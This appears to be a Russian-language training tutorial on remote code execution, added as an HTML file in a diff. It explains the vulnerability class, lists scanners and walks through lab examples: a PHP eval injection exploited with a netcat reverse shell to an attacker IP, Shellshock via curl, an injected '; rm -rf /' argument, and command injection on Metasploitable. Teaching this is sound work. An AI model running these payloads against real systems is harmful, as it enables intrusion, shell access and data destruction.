@@ -1,0 +1,282 @@
+<html>
+
+<head>
+<meta http-equiv=Content-Type content="text/html; charset=utf-8">
+<meta name=Generator content="Microsoft Word 15 (filtered)">
+<style>
+<!--
+ /* Font Definitions */
+ @font-face
+	{font-family:"Cambria Math";
+	panose-1:2 4 5 3 5 4 6 3 2 4;}
+@font-face
+	{font-family:Calibri;
+	panose-1:2 15 5 2 2 2 4 3 2 4;}
+@font-face
+	{font-family:"Liberation Sans";}
+@font-face
+	{font-family:"Source Han Sans CN";
+	panose-1:0 0 0 0 0 0 0 0 0 0;}
+@font-face
+	{font-family:"Droid Sans Devanagari";
+	panose-1:0 0 0 0 0 0 0 0 0 0;}
+ /* Style Definitions */
+ p.MsoNormal, li.MsoNormal, div.MsoNormal
+	{margin-top:0in;
+	margin-right:0in;
+	margin-bottom:8.0pt;
+	margin-left:0in;
+	text-align:justify;
+	text-indent:35.45pt;
+	line-height:150%;
+	font-size:14.0pt;
+	font-family:"Times New Roman",serif;}
+.MsoChpDefault
+	{font-family:"Calibri",sans-serif;}
+@page WordSection1
+	{size:595.3pt 841.9pt;
+	margin:56.7pt 42.5pt 56.7pt 85.05pt;}
+div.WordSection1
+	{page:WordSection1;}
+-->
+</style>
+
+</head>
+
+<body lang=EN-US style='word-wrap:break-word'>
+
+<div class=WordSection1>
+<h1>
+<p class=MsoNormal><b><span lang=RU style='font-size:20.0pt;line-height:115%;font-family:"Times New Roman",serif'>RCE. Автор: Женин Михаил</span></b></p></h1>
+
+<p class=MsoNormal><b><span lang=RU >RCE (Remote code execution)</span></b><span
+lang=RU> — означает удаленное выполнение кода, представляет собой тип
+уязвимости, который позволяет злоумышленнику выполнять произвольный код на
+удаленном компьютере или сервере. Это может позволить злоумышленнику получить
+доступ к конфиденциальной информации, изменить или удалить данные или получить
+контроль над системой.</span></p>
+
+<p class=MsoNormal><span lang=RU>Уязвимости RCE часто встречаются в программном
+обеспечении или веб-приложениях, которые позволяют выполнять введенные
+пользователем данные в виде кода. Например, веб-приложение, позволяющее пользователям
+загружать и запускать собственные скрипты или подключаемые модули, может быть
+уязвимо для RCE, если оно не проверяет или не очищает пользовательский ввод.
+Затем злоумышленник может загрузить и выполнить вредоносный код, потенциально
+получив доступ к системе или манипулируя ее поведением.</span></p>
+
+<p class=MsoNormal><span lang=RU>Уязвимости RCE может быть трудно обнаружить и
+предотвратить, поскольку они часто связаны со сложным взаимодействием между
+различными частями системы. Для защиты от уязвимостей RCE важно использовать
+методы безопасного кодирования, проводить регулярные аудиты безопасности и
+обновлять программное обеспечение и приложения с помощью последних исправлений
+безопасности.</span></p>
+
+<p class=MsoNormal><span lang=RU>&nbsp;</span></p>
+
+<p class=MsoNormal><span lang=RU>Существует несколько инструментов, которые
+могут обнаруживать уязвимости RCE, в том числе:</span></p>
+
+<p class=MsoNormal><span lang=RU>1.      Инструменты статического анализа кода,
+такие как Fortify Static Code Analyzer, Coverity и Checkmarx, которые могут
+сканировать исходный код программы и выявлять потенциальные уязвимости RCE.</span></p>
+
+<p class=MsoNormal><span lang=RU>2.      Инструменты динамического анализа,
+такие как Burp Suite, ZAP и AppScan, которые могут тестировать программу на
+наличие уязвимостей RCE, моделируя атаки и наблюдая за поведением программы.</span></p>
+
+<p class=MsoNormal><span lang=RU>3.      Инструменты тестирования на
+проникновение, такие как Metasploit и Core Impact, которые можно использовать
+для специального тестирования уязвимостей RCE, пытаясь использовать их и
+проверять их существование.</span></p>
+
+<p class=MsoNormal><span lang=RU>4.      Сканеры сетевой безопасности, такие
+как Nessus и OpenVAS, которые могут сканировать сеть и выявлять потенциальные
+уязвимости RCE в системах и приложениях, подключенных к ней.</span></p>
+
+<p class=MsoNormal><span lang=RU>В дополнение к этим инструментам для
+обнаружения уязвимостей RCE также можно использовать ручное тестирование и
+проверку кода. Важно использовать комбинацию этих инструментов и методов, чтобы
+убедиться, что все потенциальные уязвимости RCE идентифицированы и устранены.</span></p>
+
+<p class=MsoNormal><span lang=RU>&nbsp;</span></p>
+
+<p class=MsoNormal><span lang=RU>Использование уязвимостей RCE в соревновании
+CTF может быть сложной задачей, поскольку требует глубокого понимания
+уязвимостей безопасности, создания полезной нагрузки и других сложных тем. </span></p>
+
+<p class=MsoNormal><span lang=RU>Шаги по поиску </span>RCE<span lang=RU>
+уязвимости:</span></p>
+
+<p class=MsoNormal><span lang=RU>1.      Определите уязвимость, изучив описание
+проблемы, запустив сканеры уязвимостей или другие инструменты или вручную
+протестировав приложение или систему.</span></p>
+
+<p class=MsoNormal><span lang=RU>2.      Создайте полезную нагрузку, которая
+использует уязвимость, предоставив пользовательский ввод, который будет
+выполняться как код, что позволит вам выполнять произвольный код в системе.</span></p>
+
+<p class=MsoNormal><span lang=RU>3.      Выполните полезную нагрузку,
+предоставив ее в качестве входных данных для приложения или системы либо через
+пользовательский интерфейс, либо с помощью инструмента, такого как интерфейс
+командной строки или сетевой сканер.</span></p>
+
+<p class=MsoNormal><span lang=RU>4.      Убедитесь, что полезная нагрузка
+выполнена успешно, проверив ожидаемые результаты, такие как новая учетная
+запись пользователя с правами администратора, измененные или удаленные данные
+или доступ к конфиденциальной информации.</span></p>
+
+<p class=MsoNormal><span lang=RU>&nbsp;</span></p>
+
+<p class=MsoNormal><b><span lang=RU>Пример 1. Эксплуатация RCE с использованием
+инъекции кода</span></b></p>
+
+<p class=MsoNormal><span lang=RU>На сайте присутствует такой код:</span></p>
+
+<p class=MsoNormal align=left style='margin-left:35.45pt;text-align:left;
+text-indent:0in;line-height:normal'><span style='font-family:"Courier New";
+color:#4078F2'>&lt;?PHP</span><span style='font-family:"Courier New";
+color:#383A42'><br>
+  $name=$_GET[</span><span style='font-family:"Courier New";color:#50A14F'>&quot;param&quot;</span><span
+style='font-family:"Courier New";color:#383A42'>];</span></p>
+
+<p class=MsoNormal align=left style='margin-left:35.45pt;text-align:left;
+text-indent:0in;line-height:normal'><span style='font-family:"Courier New";
+color:#4078F2'>?&gt;</span><span style='font-family:"Courier New";color:#383A42'><br>
+&lt;</span><span style='font-family:"Courier New";color:#E45649'>html</span><span
+style='font-family:"Courier New";color:#383A42'>&gt;<br>
+&lt;</span><span style='font-family:"Courier New";color:#E45649'>h1</span><span
+style='font-family:"Courier New";color:#383A42'>&gt;Yousend: &lt;/</span><span
+style='font-family:"Courier New";color:#E45649'>h1</span><span
+style='font-family:"Courier New";color:#383A42'>&gt;<br>
+&lt;</span><span style='font-family:"Courier New";color:#E45649'>p</span><span
+style='font-family:"Courier New";color:#383A42'>&gt;</span><span
+style='font-family:"Courier New";color:#4078F2'>&lt;?PHP</span><span
+style='font-family:"Courier New";color:#383A42'> @</span><span
+style='font-family:"Courier New";color:#A626A4'>eval</span><span
+style='font-family:"Courier New";color:#383A42'> (</span><span
+style='font-family:"Courier New";color:#50A14F'>&quot;echo &quot;</span><span
+style='font-family:"Courier New";color:#383A42'> . </span><span lang=RU
+style='font-family:"Courier New";color:#383A42'>$</span><span style='font-family:
+"Courier New";color:#383A42'>name</span><span lang=RU style='font-family:"Courier New";
+color:#383A42'> . </span><span lang=RU style='font-family:"Courier New";
+color:#50A14F'>&quot;;&quot;</span><span lang=RU style='font-family:"Courier New";
+color:#383A42'>)</span><span lang=RU style='font-family:"Courier New";
+color:#4078F2'>?&gt;</span><span lang=RU style='font-family:"Courier New";
+color:#383A42'>&lt;</span><span style='font-family:"Courier New";color:#E45649'>p</span><span
+lang=RU style='font-family:"Courier New";color:#383A42'>&gt;<br>
+&lt;/</span><span style='font-family:"Courier New";color:#E45649'>html</span><span
+lang=RU style='font-family:"Courier New";color:#383A42'>&gt;</span></p>
+
+<p class=MsoNormal align=left style='margin-left:35.45pt;text-align:left;
+text-indent:0in;line-height:normal'><span lang=RU>&nbsp;</span></p>
+
+<p class=MsoNormal style='margin-bottom:0in'><span lang=RU>Видно, что
+реализован он через функцию <b>eval, </b>а переданные пользователем данные
+попадают в нее без валидации — это позволит передавать PHP код, и он
+выполнится. </span></p>
+
+<p class=MsoNormal><span lang=RU>Запускаем обратный шелл на атакуемом узле,
+который будет подключаться к атакующему.</span></p>
+
+<p class=MsoNormal><span lang=RU>Вначале в Kali Linux откроем порт на
+прослушивание:</span></p>
+
+<p class=MsoNormal ><span lang=RU><img
+width=409 height=37 id="Рисунок 8" src="RCE_files/image001.png"></span></p>
+
+<p class=MsoNormal><span lang=RU>Далее подключаемся к порту 6666. Для этого
+передадим такой запрос:</span></p>
+
+<p class=MsoNormal><b><span style='font-family:"Courier New";color:#383A42'>handler.PHP?param=text;passthru('nc
+</span></b><b><span style='font-family:"Courier New";color:#986801'>192.168.56.103</span></b><b><span
+style='font-family:"Courier New";color:#383A42'> </span></b><b><span
+style='font-family:"Courier New";color:#986801'>6666</span></b><b><span
+style='font-family:"Courier New";color:#383A42'> -e /bin/sh');</span></b></p>
+
+<p class=MsoNormal style='margin-bottom:0in'><span lang=RU>В результате получим
+подключение к узлу атакующего со стороны сервера:</span></p>
+
+<p class=MsoNormal ><span lang=RU><img
+width=478 height=154 id="Рисунок 7" src="RCE_files/image002.png"></span></p>
+
+<p class=MsoNormal><span lang=RU>Шелл будет действовать даже после закрытия
+страницы. Далее можно закрепиться в системе, поднять свои права или
+использовать более продвинутый сценарий эксплуатации.</span></p>
+
+<p class=MsoNormal><span lang=RU>&nbsp;</span></p>
+
+<p class=MsoNormal><b><span lang=RU>Пример 2. Эксплуатация RCE </span></b><b>Shellshock</b></p>
+
+<p class=MsoNormal><span lang=RU>Одним из примеров уязвимости RCE является
+уязвимость Shellshock, затрагивающая оболочку Bash, которая обычно используется
+во многих операционных системах. Эта уязвимость позволяла злоумышленнику
+выполнять произвольные команды в системе, отправляя специально созданные
+запросы в оболочку Bash.</span></p>
+
+<p class=MsoNormal><span lang=RU>&nbsp;</span></p>
+
+<p class=MsoNormal><span lang=RU>Вот пример того, как злоумышленник может
+использовать уязвимость Shellshock для выполнения произвольного кода в целевой
+системе:</span></p>
+
+<p class=MsoNormal  style='text-indent:0in'><span
+lang=RU><img width=580 height=66 id="Рисунок 1" src="RCE_files/image003.png"></span></p>
+
+<p class=MsoNormal><span lang=RU>В этом примере злоумышленник использует
+команду curl для отправки вредоносного запроса в оболочку Bash в целевой
+системе. Запрос содержит код, который при выполнении позволяет злоумышленнику
+прочитать файл /etc/passwd в системе.</span></p>
+
+<p class=MsoNormal><span lang=RU>&nbsp;</span></p>
+
+<p class=MsoNormal><b><span lang=RU>Пример 3. Эксплуатация RCE в настольных
+приложениях</span></b></p>
+
+<p class=MsoNormal  style='text-indent:0in'><span
+lang=RU><img width=624 height=358 id="Рисунок 23" src="RCE_files/image004.png"></span></p>
+
+<p class=MsoNormal><span lang=RU>В этом коде программа считывает ввод из
+аргументов командной строки и выполняет его как команду с помощью функции
+system. Это создает уязвимость RCE, поскольку пользователь может ввести любую
+команду, которую он хочет, и она будет выполнена программой, потенциально
+позволяя пользователю выполнять произвольный код в системе.</span></p>
+
+<p class=MsoNormal><span lang=RU>&nbsp;</span></p>
+
+<p class=MsoNormal><span lang=RU>Например, если злоумышленник вводит в качестве
+аргумента следующую команду:</span></p>
+
+<p class=MsoNormal  style='text-indent:0in'><span
+lang=RU><img width=623 height=53 id="Рисунок 24" src="RCE_files/image005.png"></span></p>
+
+<p class=MsoNormal><span lang=RU>Программа выполнит команду &quot;; rm -rf /;
+#&quot;, которая удалит все файлы и каталоги в системе. Это может привести к
+серьезным повреждениям и поставить под угрозу безопасность системы.</span></p>
+
+<p class=MsoNormal><span lang=RU>&nbsp;</span></p>
+
+<p class=MsoNormal><b><span lang=RU>Пример 4. Эксплуатация RCE в виртуальной
+машине </span></b><b>Metasploitable</b></p>
+
+<p class=MsoNormal><span lang=RU>Допустим, есть страница, которая позволяет
+получить имя хоста по адресу или наоборот.</span></p>
+
+<p class=MsoNormal style='text-indent:0in'><span
+lang=RU><img width=597 height=273 id="Рисунок 11" src="RCE_files/image006.png"></span></p>
+
+<p class=MsoNormal><span lang=RU>При этом есть подозрение, что страница
+подвержена RCE, так как в основе приложения лежит выполнение команды ОС. Для
+проверки попробуем отправить несколько команд, разделив их символом «;»:</span></p>
+
+<p class=MsoNormal style='text-indent:0in'><span
+lang=RU><img width=628 height=289 id="Рисунок 12" src="RCE_files/image007.png"></span></p>
+
+<p class=MsoNormal><span lang=RU>Видим, что последовательно выполняются две
+команды — значит, инъекция команд возможна. Можно получить на удаленном хосте
+шелл с правами пользователя www-data.</span></p>
+
+</div>
+
+</body>
+
+</html>
